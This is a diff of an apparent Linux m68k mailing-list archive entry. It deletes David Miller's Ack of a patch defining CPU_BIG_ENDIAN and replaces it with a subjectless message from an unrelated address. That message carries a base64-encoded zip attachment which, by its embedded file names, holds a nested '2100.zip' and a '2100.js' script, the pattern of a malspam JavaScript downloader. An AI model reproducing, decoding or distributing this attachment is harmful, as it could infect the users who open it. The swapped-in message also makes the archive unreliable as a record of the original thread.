@@ -1,45 +1,70 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH 1/2] arch: Define CPU_BIG_ENDIAN for all fixed big
- endian archs
-Date: Fri, 09 Jun 2017 12:40:25 -0400 (EDT)
-Message-ID: <20170609.124025.1597341888979066145.davem@davemloft.net>
-References: <1496960243-196898-1-git-send-email-babu.moger@oracle.com>
-        <1496960243-196898-2-git-send-email-babu.moger@oracle.com>
+From: <armouralumni@yahoo.com>
+Subject: (unknown)
+Date: Fri, 09 Jun 2017 19:04:10 -0000
+Message-ID: <149703505024.12490.780615705810922736@kbrnet.ru>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="735758270.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-m68k-owner@vger.kernel.org>
-Received: from shards.monkeyblade.net ([184.105.139.130]:33820 "EHLO
-        shards.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751803AbdFIQk3 (ORCPT
-        <rfc822;linux-m68k@vger.kernel.org>); Fri, 9 Jun 2017 12:40:29 -0400
-In-Reply-To: <1496960243-196898-2-git-send-email-babu.moger@oracle.com>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-m68k-owner@vger.kernel.org
 List-Id: linux-m68k@vger.kernel.org
-To: babu.moger@oracle.com
-Cc: ysato@users.sourceforge.jp, geert@linux-m68k.org, jonas@southpole.se, stefan.kristiansson@saunalahti.fi, shorne@gmail.com, jejb@parisc-linux.org, deller@gmx.de, viro@zeniv.linux.org.uk, mpe@ellerman.id.au, peterz@infradead.org, mingo@redhat.com, jcmvbkbc@gmail.com, linux-kernel@vger.kernel.org, uclinux-h8-devel@lists.sourceforge.jp, linux-m68k@vger.kernel.org, openrisc@lists.librecores.org, linux-parisc@vger.kernel.org, sparclinux@vger.kernel.org
+To: linux-m68k@lists.linux-m68k.org
 
-From: Babu Moger <babu.moger@oracle.com>
-Date: Thu,  8 Jun 2017 15:17:22 -0700
-
-> While working on enabling queued rwlock on SPARC, found
-> this following code in include/asm-generic/qrwlock.h
-> which uses CONFIG_CPU_BIG_ENDIAN to clear a byte.
-> 
-> static inline u8 *__qrwlock_write_byte(struct qrwlock *lock)
->  {
-> 	return (u8 *)lock + 3 * IS_BUILTIN(CONFIG_CPU_BIG_ENDIAN);
->  }
-> 
-> Problem is many of the fixed big endian architectures dont define
-> CPU_BIG_ENDIAN and clears the wrong byte.
-> 
-> Define CPU_BIG_ENDIAN for all the fixed big endian architecture.
-> 
-> Here is the orinal discussion
-> http://www.spinics.net/lists/devicetree/msg178101.html
-> 
-> Signed-off-by: Babu Moger <babu.moger@oracle.com>
-> Suggested-by: Arnd Bergmann <arnd@arndb.de>
-
-Acked-by: David S. Miller <davem@davemloft.net>
+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
